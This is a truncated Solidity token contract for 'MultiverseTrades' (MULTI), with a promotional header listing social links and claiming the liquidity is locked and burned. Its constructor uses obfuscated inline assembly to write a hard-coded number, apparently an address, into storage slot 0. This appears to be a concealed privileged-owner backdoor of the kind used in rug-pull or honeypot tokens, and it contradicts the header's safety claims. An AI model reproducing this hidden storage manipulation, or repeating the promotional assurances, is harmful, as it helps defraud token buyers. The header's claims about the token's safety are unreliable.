/*
Welcome to MultiverseTrades

Telegram: https://t.me/MultiverseTrades
Twitter: https://twitter.com/MultiverseTrades
https://MultiverseTrades.space
LOCKED
LP Burned
Always DYOR
MoonGem
...
contract MultiverseTrades {
    string public constant name = "MultiverseTrades";
    string public constant symbol = "MULTI";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(443256680547890633555684979476319806091911273557, 1))}
